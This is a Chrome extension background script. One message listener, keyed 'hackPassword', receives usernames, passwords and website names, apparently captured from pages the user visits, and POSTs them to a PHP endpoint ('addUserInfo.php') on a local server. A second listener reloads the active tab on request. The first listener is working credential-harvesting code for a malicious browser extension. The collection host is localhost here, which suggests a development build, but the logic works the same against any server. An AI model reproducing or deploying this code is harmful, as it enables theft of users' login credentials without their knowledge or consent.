chrome.runtime.onMessage.addListener(function(response, sender, sendResponse){

	if(response[0]=="hackPassword"){
		$.post("http://localhost:8888/userData/api/addUserInfo.php",
	    {
	        username: response[1],
	        password: response[2],
	        website: response[3]
	    },
	    function(data, status){
	    	//done
	    });
	}
});


chrome.extension.onMessage.addListener( function(request,sender,sendResponse)
{
    if(request.action=="reload"){
		chrome.tabs.query({active:true,windowType:"normal", currentWindow: true},function(d){
			chrome.tabs.sendRequest(d[0].id, {action: "reload", loopCount: request.loopCount, wait: request.wait } );
		});
    }
});
